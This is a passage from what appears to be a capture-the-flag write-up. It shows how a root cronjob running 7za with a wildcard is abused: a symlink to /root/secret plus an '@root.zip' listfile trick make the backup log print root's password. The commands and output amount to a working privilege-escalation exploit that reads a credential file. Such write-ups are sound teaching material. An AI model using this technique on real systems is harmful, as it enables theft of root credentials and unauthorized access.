
7zip also includes a listfile feature that can be used to supply one or more filenames.

## PoC

Retrived from the /etc/crontab file, there seems to be an backup.sh script executed with root permissions.

```
#!/bin/bash
password=`cat /root/secret`
cd /var/www/html/uploads
rm *.tmp
7za a /opt/backups/backup.zip -p$password -tzip *.zip > /opt/backups/backup.log
```

We will proceed by creating two files in /var/www/html/uploads/.

We begin by creating the list file which is a symbolic link that points to /root/secret which is the root user's password.

```
www-data@zipper:/var/www/html/uploads$ ln -s /root/secret root.zip
ln -s /root/secret root.zip
```

Next we create a file named @root.zip which will tell 7z that root.zip is a list file:

```
www-data@zipper:/var/www/html/uploads$ touch @root.zip
```
```
www-data@zipper:/var/www/html/uploads$ ls -la
lrwxrwxrwx 1 www-data www-data   12 Jul 31 13:52 root.zip -> /root/secret
```

When 7z executes, it will treat root.zip as a file containing the list of files it should compress, but reads /root/secret (root's password) and as the content of this file isn't a list of files, it will throw an error showing the content.

After waiting for the cronjob to trigger we read the log file and get the contents of /root/secret:

```
www-data@zipper:/opt/backups$ cat backup.log
/root/secret : WildCardsGoingWild
```